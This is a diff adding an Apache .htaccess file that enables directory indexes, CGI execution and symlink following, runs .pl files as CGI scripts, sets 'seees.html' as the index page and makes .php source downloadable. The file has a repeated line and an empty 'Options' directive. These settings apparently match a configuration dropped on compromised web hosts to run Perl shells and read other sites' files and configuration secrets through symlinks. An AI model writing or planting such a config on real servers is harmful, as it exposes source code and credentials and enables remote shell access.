@@ -1,0 +1,10 @@
+OPTIONS Indexes Includes ExecCGI FollowSymLinks	
+ AddType application/x-httpd-cgi .pl 
+ AddHandler cgi-script .pl 
+ AddHandler cgi-script .pl
+
+ 
+ Options 
+ DirectoryIndex seees.html 
+ RemoveHandler .php 
+ AddType application/octet-stream .php
